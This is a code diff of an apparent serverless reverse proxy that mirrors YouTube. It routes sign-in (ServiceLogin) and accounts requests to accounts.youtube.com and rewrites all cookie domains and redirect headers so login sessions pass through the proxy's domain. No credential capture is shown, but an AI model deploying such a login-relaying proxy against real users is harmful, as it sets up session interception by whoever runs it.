@@ -1,23 +1,27 @@
-const { createProxyMiddleware } = require("http-proxy-middleware");
+const httpProxy = require("http-proxy");
+const proxy = httpProxy.createProxyServer({});
 
+// Intercept tất cả requests dựa trên referer/origin
 module.exports = (req, res) => {
-  let target = "https://www.youtube.com/";//your website url
-  //   if (
-  //     req.url.startsWith("/api") ||
-  //     req.url.startsWith("/auth") ||
-  //     req.url.startsWith("/banner") ||
-  //     req.url.startsWith("/CollegeTask")
-  //   ) {
-  //     target = "http://106.15.2.32:6969";
-  //   }
+  const referer = req.headers.referer || "";
+  let target = "https://www.youtube.com";
+  
+  // Nếu request đến từ accounts page
+  if (referer.includes("accounts.youtube") || req.url.includes("ServiceLogin")) {
+    target = "https://accounts.youtube.com";
+  }
+  // Nếu là request static từ google
+  else if (req.url.includes("google.com") || req.url.includes("gstatic")) {
+    target = "https://www.google.com";
+  }
 
-  createProxyMiddleware({
-    target,
+  proxy.web(req, res, { 
+    target, 
     changeOrigin: true,
-    pathRewrite: {
-      // rewrite request path `/backend`
-      //  /backend/user/login => http://google.com/user/login
-      //   "^/backend/": "/",
-    },
-  })(req, res);
+    autoRewrite: true,      // Tự động rewrite location headers
+    protocolRewrite: "https",
+    cookieDomainRewrite: {
+      "*": ""  // Rewrite cookie domain để tránh lỗi cookie cross-domain
+    }
+  });
 };
